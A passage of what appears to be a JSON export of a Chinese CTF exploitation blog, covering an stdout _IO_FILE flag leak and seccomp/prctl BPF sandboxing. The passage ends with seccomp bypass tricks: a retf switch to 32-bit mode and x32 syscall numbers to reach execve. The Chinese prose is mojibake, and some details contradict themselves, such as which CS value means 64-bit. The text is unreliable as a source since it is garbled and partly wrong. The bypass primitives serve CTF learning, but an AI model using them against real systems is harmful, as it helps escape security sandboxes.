_IO_IS_APPENDING)è¯­å¥ï¼Œè€Œä¸è¦ä½¿ç¨‹åºæµè¿›å…¥else ifè¯­å¥ã€‚\n\n## 4.ç»¼ä¸Šä¸‰ä¸ªæ¡ä»¶ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nf->_flags & _IO_NO_WRITES == FALSE\n((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) == FALSE\nfp->_flags & _IO_IS_APPENDING == TRUE\n```\n\nå†åŠ ä¸Šflagså€¼çš„ç›¸å…³å®å®šä¹‰ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n//é«˜16ä½\n#define _IO_MAGIC 0xFBAD0000 /* Magic number */\n#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */\n#define _IO_MAGIC_MASK 0xFFFF0000\n\n//ä½16ä½\n-------------------------------------------------------------------\n#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */\n#define _IO_UNBUFFERED 2\n#define _IO_NO_READS 4 /* Reading not allowed */\n#define _IO_NO_WRITES 8 /* Writing not allowd */\n#define _IO_EOF_SEEN 0x10\n#define _IO_ERR_SEEN 0x20\n#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */\n#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/\n#define _IO_IN_BACKUP 0x100\n#define _IO_LINE_BUF 0x200\n#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */\n#define _IO_CURRENTLY_PUTTING 0x800\n#define _IO_IS_APPENDING 0x1000\n#define _IO_IS_FILEBUF 0x2000\n#define _IO_BAD_SEEN 0x4000\n#define _IO_USER_LOCK 0x8000\n```\n\nflagsçš„é«˜16ä½ä¸º_IO_MAGICï¼ŒåŸºæœ¬å›ºå®šï¼Œç”±libcç¡®å®šï¼Œä¸åŒç‰ˆæœ¬å¯èƒ½æœ‰å·®å¼‚ã€‚åé¢ä½16ä½åˆ†åˆ«å¯¹åº”ä¸åŒçš„è¡¨ç¤ºã€‚\n\nå¯å¾—æœ€ç»ˆçš„flagsåº”è¯¥ä¸º0xFBAD1800ï¼Œå…¶å®ä¹Ÿä¸ä¸€å®šéå¾—æ˜¯è¿™ä¸ªå€¼ï¼Œåªè¦æ»¡è¶³ä»¥ä¸Šæ‰€åˆ—çš„æ¡ä»¶å³å¯ï¼š\n\nf->flag & 0xa00 and f->flag & 0x1000 == 1ä»¥åŠf->write_base != f->write_ptr\n\næœ€åè®¾ç½®_IO_write_baseæŒ‡å‘æƒ³è¦æ³„éœ²çš„ä½ç½®ï¼Œ_IO_write_ptræŒ‡å‘æ³„éœ²ç»“æŸçš„ä½ç½®å³å¯ã€‚\n\nâ–²è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯_IO_CURRENTLY_PUTTINGæ ‡å¿—ä½åœ¨ç¨‹åºå·²ç»æœ‰æ‰“å°è¿‡ä¸œè¥¿çš„æƒ…å†µä¸‹å°±å·²ç»æ˜¯1äº†ï¼Œæ²¡æœ‰æ‰“å°è¿‡åˆ™ä¸º0ã€‚\n\n \n\n \n","tags":["pwn-Skill"],"categories":["PWN"]},{"title":"Seccomp_Before","url":"/2021/08/19/Seccomp_Before/","content":"\n1.å¸¸è§Seccompï¼š\n\n(1)åº“å®‰è£…ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\napt install libseccomp-dev libseccomp2 seccomp\n```\n\n(2)æ­£å¸¸çš„ä½¿ç”¨seccopmå¼€å¯ï¼š\n\nâ‘ å…ˆåˆ›å»ºåˆå§‹åŒ–scmp_filter_ctxç»“æ„ä½“ï¼Œå¹¶ä¸”ç»™å®šåˆå§‹è§„åˆ™ï¼š\n\nscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);\n\nè¿™é‡Œå°†åˆå§‹è§„åˆ™è®¾ç½®ä¸ºSCMP_ACT_ALLOWï¼Œå³å…è®¸æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦æœ‰è§„åˆ™å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Kill the process\n*/\n#define SCMP_ACT_KILL_PROCESS 0x80000000U\n/**\n* Kill the thread\n*/\n#define SCMP_ACT_KILL_THREAD 0x00000000U\n/**\n* Kill the thread, defined for backward compatibility\n*/\n#define SCMP_ACT_KILL SCMP_ACT_KILL_THREAD\n/**\n* Throw a SIGSYS signal\n*/\n#define SCMP_ACT_TRAP 0x00030000U\n/**\n* Notifies userspace\n*/\n#define SCMP_ACT_NOTIFY 0x7fc00000U\n/**\n* Return the specified error code\n*/\n#define SCMP_ACT_ERRNO(x) (0x00050000U | ((x) & 0x0000ffffU))\n/**\n* Notify a tracing process with the specified value\n*/\n#define SCMP_ACT_TRACE(x) (0x7ff00000U | ((x) & 0x0000ffffU))\n/**\n* Allow the syscall to be executed after the action has been logged\n*/\n#define SCMP_ACT_LOG 0x7ffc0000U\n/**\n* Allow the syscall to be executed\n*/\n#define SCMP_ACT_ALLOW 0x7fff0000U\n\n/* SECCOMP_RET_USER_NOTIF was added in kernel v5.0. */\n#ifndef SECCOMP_RET_USER_NOTIF\n#define SECCOMP_RET_USER_NOTIF 0x7fc00000U\n```\n\nâ‘¡æ·»åŠ è§„åˆ™ï¼Œå³æ·»åŠ ç™½åå•æˆ–è€…é»‘åå•ï¼š\n\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\n\nè¿™é‡Œå°†ç³»ç»Ÿè°ƒç”¨execveç»™ç¦æ­¢äº†ã€‚å‡½æ•°åŸå‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Add a new rule to the filter\n* @param ctx the filter context\n* @param action the filter action\n* @param syscall the syscall number\n* @param arg_cnt the number of argument filters in the argument filter chain\n* @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)\n*\n* This function adds a series of new argument/value checks to the seccomp\n* filter for the given syscall; multiple argument/value checks can be\n* specified and they will be chained together (AND'd together) in the filter.\n* If the specified rule needs to be adjusted due to architecture specifics it\n* will be adjusted without notification. Returns zero on success, negative\n* values on failure.\n*\n*/\nint seccomp_rule_add(scmp_filter_ctx ctx,\nuint32_t action, int syscall, unsigned int arg_cnt, ...);\n```\n\nå³(ç»“æ„ä½“ï¼Œè§„åˆ™ï¼Œè§„åˆ™ç”Ÿæ•ˆçš„ç³»ç»Ÿè°ƒç”¨ï¼Œarg_cntï¼Œscmp_arg_cmp)ã€‚\n\nA.å…¶ä¸­arg_cntè¡¨ç¤ºå‡½æ•°seccomp_rule_addåé¢ä¼ å…¥å‚æ•°çš„ä¸ªæ•°ï¼Œå¦‚æœä¸º0ï¼Œåˆ™ç›´æ¥ç¦æ­¢execveï¼Œåé¢çš„scmp_arg_cmpéƒ½ä¸ç”¨èµ‹å€¼ï¼Œèµ‹å€¼äº†ä¹Ÿæ²¡ç”¨ã€‚\n\nB.å¦‚æœä¸ä¸º0ï¼Œåˆ™å†çœ‹ä¹‹åseccomp_rule_addå‡½æ•°ä¹‹åä¼ å…¥çš„å‚æ•°ï¼Œèµ‹å€¼ä¸º1ï¼Œåˆ™åªå…è®¸ä¸€æ¡è§„åˆ™ã€‚èµ‹å€¼ä¸º2ï¼Œåˆ™éœ€åŒæ—¶æ»¡è¶³ä¹‹åçš„ä¸¤æ¡è§„åˆ™æ‰ä¼šç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n//ä»0å¼€å§‹è®¡ç®—å‚æ•°ä¸ªæ•°\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),1,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//è¢«æ‹¦æˆª\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//ä¸è¢«æ‹¦æˆª\n//seccomp_rule_addå‚æ•°ä¸ªæ•°è®¾ç½®ä¸º2ï¼Œä½†æ˜¯åç»­æ²¡æœ‰æ·»åŠ è§„åˆ™ï¼Œåˆ™é»˜è®¤ä¸æ»¡è¶³ï¼Œåˆ™ä¸ä¼šç”Ÿæ•ˆ\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//è¢«æ‹¦æˆª\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//ä¸è¢«æ‹¦æˆª\n```\n\nä½†æ˜¯ä½¿ç”¨seccompï¼Œä¸€æ—¦è¢«æ‹¦æˆªï¼Œåˆ™ç¨‹åºç›´æ¥æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶ä¸­æ–­ï¼Œæ— æ³•æ‰§è¡Œä¹‹åçš„ä»£ç ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Specify an argument comparison struct for use in declaring rules\n* @param arg the argument number, starting at 0\n* @param op the comparison operator, e.g. SCMP_CMP_*\n* @param datum_a dependent on comparison\n* @param datum_b dependent on comparison, optional\n*/\n#define SCMP_CMP(...) ((struct scmp_arg_cmp){__VA_ARGS__})\n\n/**\n* Specify an argument comparison struct for argument 0\n*/\n#define SCMP_A0(...) SCMP_CMP(0, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 1\n*/\n#define SCMP_A1(...) SCMP_CMP(1, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 2\n*/\n#define SCMP_A2(...) SCMP_CMP(2, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 3\n*/\n#define SCMP_A3(...) SCMP_CMP(3, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 4\n*/\n#define SCMP_A4(...) SCMP_CMP(4, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 5\n*/\n#define SCMP_A5(...) SCMP_CMP(5, __VA_ARGS__)\n\n/**\n* Comparison operators\n*/\nenum scmp_compare {\n_SCMP_CMP_MIN = 0,\nSCMP_CMP_NE = 1, /**< not equal */\nSCMP_CMP_LT = 2, /**< less than */\nSCMP_CMP_LE = 3, /**< less than or equal */\nSCMP_CMP_EQ = 4, /**< equal */\nSCMP_CMP_GE = 5, /**< greater than or equal */\nSCMP_CMP_GT = 6, /**< greater than */\nSCMP_CMP_MASKED_EQ = 7, /**< masked equality */\n_SCMP_CMP_MAX,\n};\n\n/**\n* Argument datum\n*/\ntypedef uint64_t scmp_datum_t;\n\n/**\n* Argument / Value comparison definition\n*/\nstruct scmp_arg_cmp {\nunsigned int arg; /**< argument number, starting at 0 */\nenum scmp_compare op; /**< the comparison op, e.g. SCMP_CMP_* */\nscmp_datum_t datum_a;\nscmp_datum_t datum_b;\n};\n```\n\nâ‘¢å¯ç”¨seccompä¿æŠ¤ï¼š\n\nseccomp_load(ctx);\n\nåˆ©ç”¨seccomp_loadå‡½æ•°åŠ è½½å¯ç”¨ä¿æŠ¤ã€‚å‡½æ•°åŸå‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Return the notification fd from a filter that has already been loaded\n* @param ctx the filter context\n*\n* This returns the listener fd that was generated when the seccomp policy was\n* loaded. This is only valid after seccomp_load() with a filter that makes\n* use of SCMP_ACT_NOTIFY.\n*\n*/\nint seccomp_notify_fd(const scmp_filter_ctx ctx);\n```\n\nè¿™é‡Œä¼ å…¥scmp_filterç»“æ„ä½“å³å¯ï¼Œå¦‚æœä¸ä¼ å…¥\n\nä»¥ä¸Šçš„å‡å¯åœ¨seccomp.hä¸­æŸ¥çœ‹ã€‚\n\nâ–²æ€»çš„è°ƒç”¨å°±æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nscmp_filter_ctx ctx;\nctx = seccomp_init(SCMP_ACT_ALLOW);\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\nseccomp_load(ctx);\n```\n\nè®°å¾—å¼•ç”¨åº“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#include <seccomp.h>\n#include <linux/seccomp.h>\n```\n\n \n\n2.Prtctlå‡½æ•°(/usr/includ/linux/prctl.h)ï¼š\n\nåŸå‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);\n```\n\nè¿™é‡Œçš„å‚æ•°å¯ä»¥ä¸éœ€è¦å…¨éƒ¨è®¾ç½®ä¸Šï¼Œå…¶ä¸­optionæ¯”è¾ƒå…³é”®ï¼Œåœ¨PWNä¸­å¤§è‡´åˆ†ä»¥ä¸‹æƒ…å†µï¼š\n\n(1)è‹¥optionä¸ºPR_SET_NO_NEW_PRIVS(38)ï¼š\n\næ­¤æ—¶å°†ç¬¬äºŒä¸ªå‚æ•°arg2è®¾ç½®ä¸º1ï¼Œé‚£ä¹ˆç¨‹åºçš„å­çº¿ç¨‹å°±æ— æ³•é€šè¿‡execveæ¥ææƒï¼Œå°±æ˜¯pwn kernelä¸­å³ä½¿æ”¹æ‰äº†credç»“æ„ä½“ï¼Œä½¿å…¶ç‰¹æƒä¸º0ï¼Œå†æ‰§è¡Œsystem(\"/bin/sh\")ä¾ç„¶æ— æ³•ææƒã€‚å³prctl(38, 1,0,0,0)è¡¨ç¤ºç¦ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯systemå’Œonegadgetéƒ½æ²¡äº†ï¼ŒåŒæ—¶å­è¿›ç¨‹ä¹Ÿæ— æ³•è¿™æ ·æ¥è·å¾—shellã€‚\n\n(2)è‹¥optionä¸ºPR_SET_SECCOMP(22)ï¼š\n\næ­¤æ—¶å¯ä»¥é€šè¿‡å‚æ•°æ¥è®¾ç½®è§„åˆ™ï¼Œé“ç†å’Œseccompä¸€æ ·çš„ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š\n\nâ‘ å¦‚æœarg2ä¸ºSECCOMP_MODE_STRICT(1),åˆ™åªå…è®¸è°ƒç”¨read,write,_exit(è¿™ä¸ªexitä¸æ˜¯é€€å‡ºç¨‹åºçš„æ„æ€),sigreturnè¿™å‡ ä¸ªsyscallã€‚å³prctl(22,1,0,0,0)ã€‚\n\nâ‘¡å¦‚æœarg2ä¸ºSECCOMP_MODE_FILTER(2),åˆ™ä¸ºè¿‡æ»¤æ¨¡å¼,å…¶ä¸­å¯¹syscallçš„é™åˆ¶é€šè¿‡å‚æ•°3çš„ç»“æ„ä½“ï¼Œæ¥è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™ï¼Œå‡½æ•°ä¼šé‡å®šå‘åˆ°å¦ä¸€ä¸ªåŒåå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint prctl(int PR_SET_SECCOMP,const struct* sock_filter SECCOMP_MODE_FILTER,const sock_fprog prog);\n```\n\nä½†è°ƒç”¨ä¹‹å‰è¿˜æ˜¯éœ€è¦ç¦ç”¨execveï¼Œå³è°ƒç”¨å½¢å¼ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);   //è¿™é‡Œæ˜¯éœ€è¦è¿™ä¹ˆå†™çš„\nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&sfp);\n```\n\nA.å‚æ•°SECCOMP_MODE_FILTERæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œè¯¥sock_filterç»“æ„ä½“ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter { /* Filter block */\n__u16 code; /* Actual filter code */\n__u8 jt; /* Jump true */\n__u8 jf; /* Jump false */\n__u32 k; /* Generic multiuse field */\n};\n```\n\na.code:ä¸€ä¸ªå­—èŠ‚ï¼Œè¯¦ç»†å®šä¹‰æ“ä½œçš„ç±»å‹ï¼Œå‡è®¾codeä¸º0x15\n\nå…ˆçœ‹å‰å››ä½ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#define BPF_CLASS(code)\n#define BPF_LD 0x00 \n#define BPF_LDX 0x01\n#define BPF_ST 0x02\n#define BPF_STX 0x03\n#define BPF_ALU 0x04\n#define BPF_JMP 0x05\n#define BPF_RET 0x06\n#define BPF_MISC 0x07\n```\n\nè¿™é‡Œå‰å››ä½å°±æ˜¯0x5ï¼Œæ‰€ä»¥å¯¹åº”åˆ°ä¹‹åçš„å››ä½å®šä¹‰åŸŸä¸­å»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/*jmp fields */\n#define BPF_JA 0x00 \n#define BPF_JEQ 0x10\n#define BPF_JGT 0x20\n#define BPF_JGE 0x30\n#define BPF_JSET 0x40\n#define BPF_SRC(code) ((code) & 0x08)\n```\n\né‚£ä¹ˆè¿™ä¸ª0x15çš„æ“ä½œå°±æ˜¯BPF_JMP+BPF_JEQã€‚\n\nâ–²åŒç†ï¼Œldã€ldxã€ALUéƒ½æœ‰å¯¹åº”çš„å®šä¹‰åŸŸï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/*ld fields */\n#define BPF_W 0x00\n#define BPF_H 0x08\n#define BPF_B 0x10\n\n/*ldx fields */  \n#define BPF_IMM 0x00\n#define BPF_ABS 0x20\n#define BPF_IND 0x40\n#define BPF_MEM 0x60\n#define BPF_LEN 0x80\n#define BPF_MSH 0xa0\n\n/*alu fields */\n#define BPF_ADD 0x00\n#define BPF_SUB 0x10\n#define BPF_MUL 0x20\n#define BPF_DIV 0x30\n#define BPF_OR 0x40\n#define BPF_AND 0x50\n#define BPF_LSH 0x60\n#define BPF_RSH 0x70\n#define BPF_NEG 0x80\n#define BPF_MOD 0x90\n#define BPF_XOR 0xa0\n\n/*å¸¸æ•°*/\n#define BPF_K 0x00\n#define BPF_X 0x08\n```\n\nè€ŒRETä¸€èˆ¬å¯¹åº”BPF_Kï¼Œç„¶ååœ¨ä¹‹åå‚æ•°ä¸Šå†™SECCOMP_RET_KILLæˆ–è€…SECCOMP_RET_ALLOWã€‚MISCå€’æ˜¯æ²¡è§è¿‡ã€‚\n\nb.JTå’ŒJFï¼šæ˜¯ç›¸å¯¹äºå½“å‰è¯­å¥çš„åç§»ã€‚ä¾‹å¦‚(1,0)ï¼Œå‡è®¾å½“å‰è¯­å¥ä¸º0003ï¼Œåˆ™ä»£è¡¨ä¹‹å‰è¯­å¥ä¸ºçœŸï¼Œåˆ™è·³è½¬åˆ°0005ï¼Œä¸ºå‡åˆ™è·³è½¬åˆ°0004ã€‚æ‰€ä»¥å¦‚æœéƒ½æ˜¯0ï¼Œç›¸å½“äºæ˜¯ä¸ªæ— è·³è½¬è¯­å¥ï¼Œå¦‚æœéƒ½æ˜¯1ï¼Œç›¸å½“äºæ˜¯è·³è¿‡ä¸‹ä¸€æ¡è¯­å¥ã€‚\n\nc.Kï¼šå¯ä»¥å½“ä½œä¸€ä¸ªå‚æ•°ã€‚å¦‚æœæ“ä½œè¯­å¥æ˜¯æ¯”è¾ƒï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ¯”è¾ƒçš„å³å€¼A>=Kï¼Ÿã€‚ä»¥æ­¤ç±»æ¨ã€‚è¿™ä¸ªå‚æ•°çš„å€¼æ˜¯ä»seccomp_dataä¸­ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n(<linux/audit.h> ) \nstruct seccomp_data {\nint nr; /* System call number */\n__u32 arch; /* AUDIT_ARCH_* value*/\n__u64 instruction_pointer; /* CPU instruction pointer */\n__u64 args[6]; /* Up to 6 system call arguments */\n};\n```\n\nå€¼å³ä»£è¡¨åç§»ï¼Œåç§»å­—é•¿ä¸ºä¸€ä¸ªå­—èŠ‚ï¼š\n\nK==0ï¼Œä»£è¡¨nrï¼›K==4ï¼Œä»£è¡¨archï¼›K==8ï¼Œä»£è¡¨args[0]ã€‚è€Œargså…­ä¸ªå€¼ç›¸å½“äºä¼ å‚å¯„å­˜å™¨çš„å€¼ï¼šebx,ecx,edx,esi,edi,ebp(32ä½)ï¼Œrdi,rsi,rdx,r10,r8,r9(64ä½)\n\nâ–²æ‰€ä»¥(0x15,0x00,0x01,0x0000003b)å°±ä»£è¡¨if (A!= execve) goto offset_1ã€‚è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªç®€å•çš„æ“ä½œæ¥æ›¿ä»£ï¼šBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1)ã€‚å®šä¹‰è§„åˆ™å°±å¯ä»¥å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter sfi[] = {\n{0x20,0x00,0x00,0x00000000},\n{0x15,0x00,0x01,0xc000003b},\n{0x06,0x00,0x00,0x00000000},   //KILL\n{0x06,0x00,0x00,0x7fff0000}   //ALLOW\n};\n```\n\næˆ–è€…\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter filter[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), \nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), \n};\n```\n\nç”±äºåœ¨/usr/include/linux/bpf_common.hæœ‰å®å®šä¹‰ï¼Œæ‰€ä»¥ç¬¬äºŒç§æƒ…å†µä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\nB.sfpä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_fprog { /* Required for SO_ATTACH_FILTER. */\nunsigned short len; /* Number of filter blocks */\nstruct sock_filter *filter;\n};\n```\n\na.lenå³ä»£è¡¨è¯­å¥æ¡æ•°ï¼Œæ¯”å¦‚ä¸Šé¢çš„å°±æ˜¯4;\n\nb.filterå°±æ˜¯æŒ‡å‘ä¸Šé¢SECCOMP_MODE_FILTERè¿™ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆã€‚\n\nâ–²æ‰€ä»¥å®Œæ•´çš„å°±æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter sfi[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),\nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),\n};\nstruct sock_fprog sfp = {\n(unsigned short)(sizeof(filter)/sizeof(filter[0])),\nsfi,\n};\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); \nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);\n```\n\nè¿™æ ·è®¾ç½®åï¼Œå‡ºæ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nroot@241adce81c0a:/ctf/seccomp# seccomp-tools dump ./prctl_test2\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0003\n0002: 0x06 0x00 0x00 0x00000000 return KILL\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\n \n\n3.ç®€å•çš„seccompè§„åˆ™å†™ï¼š\n\n(1)ä¾æ®ç®€å•è¯­æ³•å†™è§„åˆ™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nA = sys_number\nA == 257? e0:next\nA == 1? ok:next\nreturn ALLOW\ne0:\nreturn ERRNO(0)\nok:\nreturn ALLOW\n```\n\nä¿å­˜ä¸ºseccomp_asm\n\n(2)åˆ©ç”¨seccomp-toolsæ¥ç”Ÿæˆï¼š\n\nseccomp-tools asm seccomp_asm -f raw|seccomp-tools disasm -\n\n```\n#æ³¨é‡Šå¤´\n\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0004\n0002: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0005\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0004: 0x06 0x00 0x00 0x00050000 return ERRNO(0)\n0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\nè¿™æ ·å°±å¯ä»¥æ–¹ä¾¿å†™è§„åˆ™äº†ï¼ŒåŒæ ·æœ‰ä¸ªseccomp_bpf.hçš„ä¸œè¥¿ï¼Œæ¯”è¾ƒç®€å•ï¼š\n\n[secfilter/seccomp-bpf.h at master Â· ahupowerdns/secfilter Â· GitHub](https://github.com/ahupowerdns/secfilter/blob/master/seccomp-bpf.h)\n\n \n\n4.å¸¸è§ç§ç±»åŠç»•è¿‡æ–¹å¼ï¼š\n\n(1)ç¦ç”¨execveå‡½æ•°æ—¶ï¼Œä½†æ˜¯éœ€è¦getshellæ‰è¡Œï¼Œæ­¤æ—¶å­˜åœ¨æ»¡è¶³ä¸€å®šæ¡ä»¶å¯ä»¥ä½¿ç”¨shellcodeï¼š\n\nâ‘ æœªæ£€æŸ¥archï¼š\n\nå°è¯•ä½¿ç”¨shellcodeå°†å¤„ç†å™¨è½¬æ¢ï¼Œå¦‚æœæ˜¯x64åˆ™è½¬ä¸ºi386ï¼ŒåŒç†ç±»ä¼¼ã€‚è¿™æ ·ç³»ç»Ÿè°ƒç”¨å·11å°±ä¸ä¼šè¢«è§£æä¸º64ä½ä¸­çš„__x64_sys_munmapï¼Œè€Œæ˜¯32ä½ä¸­çš„sys_execveï¼Œç»•è¿‡æ£€æŸ¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nto32:\nmov DWORD [rsp+4],0x23;\nretf;\n\nto64:\nmov DWORD [esp+4],0x33; \nretf;\n```\n\nç”±äºretfçš„æŒ‡ä»¤å®é™…æ•ˆæœä¸ºï¼šPOP CS:EIPï¼Œè¿™é‡ŒCSä¸º0x23å³ä¸º64ä½ï¼Œ0x33å³ä¸º32ä½ï¼Œæ‰€ä»¥å¦‚æœèƒ½æ‰¾åˆ°æ§åˆ¶æ ˆçš„gadgeté‚£å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥ç”¨retfï¼Œæ¯•ç«Ÿretfå…¶å®ä¹ŸæŒºå¸¸è§çš„ã€‚åŒæ—¶è¿˜æœ‰å…¶ä»–çš„å¥½ç”¨retæŒ‡ä»¤ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nRETQï¼šPOP RIP\nRETN: POP EIP\nRETF: POP CS:EIP\n```\n\nå‚è€ƒSCTF2020é‡Œé¢çš„CoolCode\n\nâ‘¡å­˜åœ¨æ£€æŸ¥æ¼æ´ï¼šif (A < 0x40000000)ï¼Œå¦‚æœå¯¹A >= 0x40000000æ²¡æœ‰é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨64ä½ä¸‹çš„x32æ¼æ´ï¼Œä½¿ç”¨ 64ä½çš„å­˜å™¨åœ°å€å’Œ 32ä½çš„åœ°å€ï¼š\n\nå…·ä½“åŸç†ä¸å¤ªæ‡‚ï¼Œåº”è¯¥æ˜¯ä¼ å‚åŸå› å§ï¼Œå¯èƒ½syscallçš„ç³»ç»Ÿè°ƒç”¨å·å¯„å­˜å™¨ä¸ºeaxï¼Œå¯¼è‡´ç³»ç»Ÿè°ƒç”¨å·0x40000003bç»•è¿‡if (A < 0x40000000)æ£€æŸ¥ï¼Œç„¶åä»¥eaxä¼ å…¥ç³»ç»Ÿè°ƒç”¨å·ä¸º0x0000003bï¼Œä»ç„¶æ‰§è¡Œäº†execveã€‚\n\nè¿™æ ·çš„è¯åœ¨åŸæ¥çš„ç³»ç»Ÿè°ƒç”¨å·åŠ ä¸Š0x400000000å³å¯ç»•è¿‡æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax,59+0x40000000;\nsyscall;\n```\n\n(2)ç¦ç”¨evecveç­‰å‡½æ•°ï¼Œå‘Šè¯‰äº†flagä½ç½®ï¼Œæˆ–è€…å°†flagä½ç½®ä»€ä¹ˆçš„æ”¾åœ¨äº†æ ˆä¸Š(å¯ä»¥ç”¨pedaæ’ä»¶ï¼šfind flag)ï¼Œåˆæˆ–è€…éœ€è¦è‡ªå·±è°ƒè¯•çˆ†ç ´flagçš„ä½ç½®ï¼Œä¸èƒ½getshellçš„ï¼Œåˆ©ç”¨open,write,readç­‰æ²¡æœ‰è¢«ç¦ç”¨çš„å‡½æ•°è¿›è¡Œè¯»å–ï¼š\n\nâ‘ shellcodeæ¨¡å¼ï¼šè¿™é‡Œå°±æ ¹æ®å„ç§è§„åˆ™é™åˆ¶æ¥ç»•è¿‡ï¼Œè‡ªå·±ç¼–å†™shellcodeã€‚(è¿™ä¸ªéœ€è¦æ±‡ç¼–åŸºç¡€ï¼Œé‡åˆ°é¢˜ç›®æ…¢æ…¢å­¦å§)\n\nâ‘¡ROPæ¨¡å¼ï¼šä¸€èˆ¬éœ€è¦åŠ«æŒæ 